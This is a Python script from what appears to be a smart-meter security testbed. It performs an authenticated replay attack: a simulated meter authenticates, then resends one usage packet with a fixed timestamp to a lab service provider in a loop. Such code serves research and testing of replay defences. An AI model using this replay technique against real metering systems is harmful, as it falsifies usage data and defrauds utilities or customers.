# attacks/replay_withAuth.py
# Authenticated Replay Attack (SM → SP)

import socket
import json
import time
import sys
import os


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from crypto.sm import SmartMeter

SP_IP = "10.0.3.1"
SP_PORT = 9999
REG_PORT = 9998

REG_MAP = {
    "sm1": "10.0.1.254", "sm2": "10.0.1.254", "sm3": "10.0.1.254",
    "sm4": "10.0.1.254", "sm5": "10.0.1.254",
    "sm6": "10.0.2.254", "sm7": "10.0.2.254", "sm8": "10.0.2.254",
    "sm9": "10.0.2.254", "sm10": "10.0.2.254"
}

REPLAY_USAGE = 2.75        
SEND_INTERVAL = 0.5       


def run_replay(sm_id):
    if sm_id not in REG_MAP:
        print("[ERROR] Invalid SM ID")
        return

    print("[ AUTHENTICATED REPLAY ATTACK STARTED]")
    print(f"[!] Compromised SM ID : {sm_id}")

   
    sm = SmartMeter(sm_id)
    sm.enroll()
    sm.authenticate()

    auth_payload = sm.build_auth_payload(b"AUTH_REQUEST")
    reg_ip = REG_MAP[sm_id]

    try:
        tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_sock.connect((reg_ip, REG_PORT))
        tcp_sock.sendall(json.dumps(auth_payload).encode())
        tcp_sock.close()
        print(f" Authenticated via REG {reg_ip}")
    except Exception as e:
        print(f" Auth failed: {e}")
        return

    print(f"[!] Replaying usage to SP {SP_IP}:{SP_PORT}")
    print(f"[!] Constant usage value: {REPLAY_USAGE}")
    print("-" * 60)

   
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    
    original_timestamp = time.time()
    original_payload = {
        "smId": sm_id,
        "usage": REPLAY_USAGE,
        "proto": "udp",
        "service": "-",
        "timestamp": original_timestamp
    }

    print(f"[ORIGINAL PACKET] {original_payload}")

    try:
        while True:
            
            udp_sock.sendto(
                json.dumps(original_payload).encode(),
                (SP_IP, SP_PORT)
            )

            print(f"[REPLAY] usage={REPLAY_USAGE}, timestamp={original_timestamp}")
            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        print("\n[!] REPLAY ATTACK STOPPED")
        udp_sock.close()



if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 replay_withAuth.py smX")
        sys.exit(1)

    run_replay(sys.argv[1])
